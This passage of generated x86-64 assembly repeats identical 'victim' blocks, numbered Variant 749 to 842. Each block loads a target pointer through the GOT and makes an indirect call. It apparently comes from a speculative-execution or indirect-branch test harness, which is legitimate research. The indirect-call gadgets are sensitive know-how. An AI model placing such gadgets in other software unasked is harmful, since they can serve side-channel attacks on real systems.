	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 749
.Lvictim_win0_var749:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 750
.Lvictim_win0_var750:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 751
.Lvictim_win0_var751:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 752
.Lvictim_win0_var752:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 753
.Lvictim_win0_var753:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 754
.Lvictim_win0_var754:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 755
.Lvictim_win0_var755:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 756
.Lvictim_win0_var756:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 757
.Lvictim_win0_var757:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 758
.Lvictim_win0_var758:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 759
.Lvictim_win0_var759:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 760
.Lvictim_win0_var760:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 761
.Lvictim_win0_var761:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 762
.Lvictim_win0_var762:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 763
.Lvictim_win0_var763:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 764
.Lvictim_win0_var764:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 765
.Lvictim_win0_var765:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 766
.Lvictim_win0_var766:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 767
.Lvictim_win0_var767:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 768
.Lvictim_win0_var768:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 769
.Lvictim_win0_var769:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 770
.Lvictim_win0_var770:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 771
.Lvictim_win0_var771:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 772
.Lvictim_win0_var772:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 773
.Lvictim_win0_var773:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 774
.Lvictim_win0_var774:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 775
.Lvictim_win0_var775:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 776
.Lvictim_win0_var776:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 777
.Lvictim_win0_var777:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 778
.Lvictim_win0_var778:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 779
.Lvictim_win0_var779:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 780
.Lvictim_win0_var780:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 781
.Lvictim_win0_var781:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 782
.Lvictim_win0_var782:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 783
.Lvictim_win0_var783:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 784
.Lvictim_win0_var784:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 785
.Lvictim_win0_var785:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 786
.Lvictim_win0_var786:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 787
.Lvictim_win0_var787:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 788
.Lvictim_win0_var788:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 789
.Lvictim_win0_var789:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 790
.Lvictim_win0_var790:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 791
.Lvictim_win0_var791:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 792
.Lvictim_win0_var792:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 793
.Lvictim_win0_var793:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 794
.Lvictim_win0_var794:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 795
.Lvictim_win0_var795:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 796
.Lvictim_win0_var796:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 797
.Lvictim_win0_var797:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 798
.Lvictim_win0_var798:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 799
.Lvictim_win0_var799:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 800
.Lvictim_win0_var800:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 801
.Lvictim_win0_var801:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 802
.Lvictim_win0_var802:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 803
.Lvictim_win0_var803:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 804
.Lvictim_win0_var804:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 805
.Lvictim_win0_var805:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 806
.Lvictim_win0_var806:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 807
.Lvictim_win0_var807:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 808
.Lvictim_win0_var808:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 809
.Lvictim_win0_var809:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 810
.Lvictim_win0_var810:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 811
.Lvictim_win0_var811:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 812
.Lvictim_win0_var812:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 813
.Lvictim_win0_var813:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 814
.Lvictim_win0_var814:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 815
.Lvictim_win0_var815:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 816
.Lvictim_win0_var816:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 817
.Lvictim_win0_var817:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 818
.Lvictim_win0_var818:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 819
.Lvictim_win0_var819:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 820
.Lvictim_win0_var820:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 821
.Lvictim_win0_var821:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 822
.Lvictim_win0_var822:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 823
.Lvictim_win0_var823:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 824
.Lvictim_win0_var824:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 825
.Lvictim_win0_var825:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 826
.Lvictim_win0_var826:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 827
.Lvictim_win0_var827:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 828
.Lvictim_win0_var828:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 829
.Lvictim_win0_var829:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 830
.Lvictim_win0_var830:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 831
.Lvictim_win0_var831:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 832
.Lvictim_win0_var832:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 833
.Lvictim_win0_var833:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 834
.Lvictim_win0_var834:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 835
.Lvictim_win0_var835:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 836
.Lvictim_win0_var836:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 837
.Lvictim_win0_var837:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 838
.Lvictim_win0_var838:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 839
.Lvictim_win0_var839:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 840
.Lvictim_win0_var840:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 841
.Lvictim_win0_var841:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 842
.Lvictim_win0_var842:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
